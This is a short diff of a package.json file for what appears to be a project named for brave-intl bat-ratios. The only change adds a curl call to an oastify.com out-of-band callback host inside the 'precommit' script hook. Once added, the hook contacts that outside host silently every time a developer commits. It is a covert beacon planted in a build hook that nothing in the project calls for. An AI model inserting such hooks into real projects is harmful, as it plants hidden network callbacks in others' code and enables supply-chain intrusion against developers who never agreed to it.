@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "precommit": "yarn test",
+    "precommit": "yarn test && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/brave-intl-bat-ratios",
     "lint": "standard",
     "lint-fix": "yarn run lint -- --fix",
     "test": "yarn run lint && yarn run test-versions",
